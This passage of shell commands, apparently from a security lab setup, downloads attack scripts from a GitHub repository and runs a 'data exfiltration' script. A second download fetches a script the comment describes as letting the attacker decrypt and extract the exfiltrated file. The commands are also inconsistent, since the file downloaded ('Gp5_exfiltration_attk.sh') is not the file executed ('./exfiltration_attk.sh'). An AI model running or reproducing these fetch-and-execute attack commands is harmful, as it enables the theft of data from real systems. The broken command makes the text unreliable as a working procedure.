...
cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_exfiltration_attk.sh && chmod +x Gp5_exfiltration_attk.sh
./exfiltration_attk.sh

# [Exfiltration] Install script for attacker to decrypt and extract the exfiltrated file
cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_after_exfiltration_attk.sh && chmod +x Gp5_after_exfiltration_attk.sh
